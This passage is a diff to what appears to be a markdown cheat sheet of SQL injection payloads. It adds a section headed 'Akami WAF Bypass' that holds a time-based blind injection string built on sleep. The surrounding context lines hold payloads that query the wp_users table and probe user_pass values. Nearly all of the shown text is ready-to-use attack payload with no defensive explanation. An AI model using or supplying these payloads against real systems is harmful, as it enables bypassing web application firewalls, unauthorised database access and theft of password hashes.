@@ -31,3 +31,7 @@
 {`foo`/*bar*/(select%2b2)}
 {`foo`/*bar*/(select+1+from+wp_users+where+user_pass+rlike+"(^)[$].*"+limit+1)}
 ```
+## Akami WAF Bypass
+```sql
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+```
